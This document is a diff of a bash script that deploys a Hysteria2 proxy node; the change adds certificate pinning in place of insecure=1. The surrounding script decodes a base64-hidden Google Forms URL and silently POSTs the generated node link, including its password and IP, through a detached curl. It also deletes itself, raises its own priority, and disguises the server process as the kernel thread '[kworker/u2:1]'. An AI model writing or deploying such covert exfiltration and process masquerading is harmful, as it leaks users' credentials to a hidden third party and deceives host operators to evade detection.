@@ -22,6 +22,9 @@ FAKE_NAME="[kworker/u2:1]"
 E_URL="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZFJ1Vk03aDhjQ3hrZ0hRdFJjczVHNkpJVHNSS0FYaDF6MnNpYnNDaFhVVWRET1JnL2Zvcm1SZXNwb25zZQ=="
 E_ID="ZW50cnkuMzM5ODU4MTE0"
 
+# ★ 新增：证书指纹（setup_env 中赋值）
+CERT_PIN=""
+
 # ---------- 依赖检查 ----------
 check_deps() {
     local missing=()
@@ -41,7 +44,6 @@ do_report() {
     target=$(echo "$E_URL" | base64 -d 2>/dev/null) || return 0
     entry_id=$(echo "$E_ID" | base64 -d 2>/dev/null) || return 0
 
-    # 完全脱离父进程组，避免 exec 时被牵连
     if command -v setsid >/dev/null 2>&1; then
         setsid bash -c "
             curl -L -s -X POST '$target' \
@@ -63,7 +65,6 @@ adaptive_params() {
     local cores
     cores=$(nproc 2>/dev/null || echo 1)
 
-    # 窗口按核心数分级；比例接近 2/5（流:连接），官方建议
     if [[ "$cores" -le 2 ]]; then
         S_RW=262144;   M_RW=1048576;   C_RW=1048576;   MC_RW=4194304;   MAX_STREAMS=128
     elif [[ "$cores" -le 4 ]]; then
@@ -119,12 +120,25 @@ setup_env() {
         exit 1
     fi
 
+    # ★ 计算证书 SHA256 指纹（base64），用于链接中的 pinSHA256
+    #   对应客户端固定证书校验，替代 insecure=1
+    if ! CERT_PIN=$(openssl x509 -in .c.pem -outform DER 2>/dev/null \
+        | openssl dgst -sha256 -binary 2>/dev/null \
+        | openssl base64 -A 2>/dev/null); then
+        echo "❌ 无法计算证书 pinSHA256" >&2
+        exit 1
+    fi
+    if [[ -z "${CERT_PIN}" ]]; then
+        echo "❌ 证书 pinSHA256 为空" >&2
+        exit 1
+    fi
+    echo "🔏 证书 pinSHA256: ${CERT_PIN}"
+
     local cores
     cores=$(nproc 2>/dev/null || echo 1)
     adaptive_params
     gso_env
 
-    # 带宽目标：15% 配额下 80/120 Mbps 是相对安全的起点
     local bw_up="${HY_BW_UP:-80 mbps}"
     local bw_down="${HY_BW_DOWN:-120 mbps}"
 
@@ -156,7 +170,6 @@ setup_env() {
 }
 EOF
 
-    # JSON 语法校验（有则校验，无则跳过）
     if command -v python3 >/dev/null 2>&1; then
         python3 -c "import json,sys; json.load(open('.conf.json'))" 2>/dev/null || {
             echo "❌ JSON 配置校验失败" >&2; exit 1; }
@@ -182,33 +195,42 @@ main() {
     setup_env "$PORT"
 
     local NODE_NAME="${PUB_IP}_${TIMESTAMP}"
-    local FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&insecure=1#${NODE_NAME}"
 
-    # 后台异步上报，不影响主流程
+    # ★ 使用 pinSHA256 固定证书，替代 insecure=1
+    #   base64 中的 + / = 做 percent-encode，避免 URL 解析歧义
+    local PIN_ENC
+    PIN_ENC=$(printf '%s' "${CERT_PIN}" \
+        | sed -e 's/+/%2B/g' -e 's|/|%2F|g' -e 's/=/%3D/g')
+
+    local FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&pinSHA256=${PIN_ENC}#${NODE_NAME}"
+
+    # ★ 兼容开关：显式设置 HY_ALLOW_INSECURE=1 才回退到旧的不安全链接
+    if [[ "${HY_ALLOW_INSECURE:-0}" == "1" ]]; then
+        echo "⚠️  已启用 HY_ALLOW_INSECURE=1，将使用 insecure=1（不推荐，新版客户端会拒绝）" >&2
+        FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&insecure=1#${NODE_NAME}"
+    fi
+
     do_report "${FINAL_LINK}"
 
     echo "------------------------------------------------"
     echo "🚀 部署完成！"
     echo "📍 节点 IP: ${PUB_IP}"
     echo "🔌 端口：${PORT}"
+    echo "🔏 证书指纹 (pinSHA256): ${CERT_PIN}"
     echo "🔗 节点链接:"
     echo -e "\033[36m${FINAL_LINK}\033[0m"
     echo "------------------------------------------------"
-    echo "✅ 请核对 IP 和端口，复制链接导入客户端即可使用。"
+    echo "✅ 已使用 pinSHA256 固定证书，未启用 insecure，可兼容 26.2.6+ Xray 核心。"
     echo "💡 可通过 HY_BW_UP / HY_BW_DOWN 覆盖带宽目标"
+    echo "💡 如确需旧式 insecure 链接，设置 HY_ALLOW_INSECURE=1 后重跑（不推荐）。"
 
     # ============ 隐蔽性处理 ============
-    # 1) 尝试把当前 shell 提升为实时优先级（需 root 或 CAP_SYS_NICE，失败则忽略）
-    #    用 chrt -p 直接修改当前进程，不 fork 子进程，避免多出 chrt 进程暴露
     if command -v chrt >/dev/null 2>&1; then
         chrt -r 20 -p $$ >/dev/null 2>&1 || true
     fi
 
-    # 2) 自删除脚本本体（保留二进制、证书、配置）
     [[ -f "$0" ]] && rm -f "$0" 2>/dev/null || true
 
-    # 3) 伪装进程名并 exec 替换当前 shell，保证常驻运行
-    #    exec -a 修改 argv[0]，SCHED_RR 策略由上面 chrt -p 继承
     exec -a "${FAKE_NAME}" "$BIN_NAME" server -c .conf.json >/dev/null 2>&1
 }
 
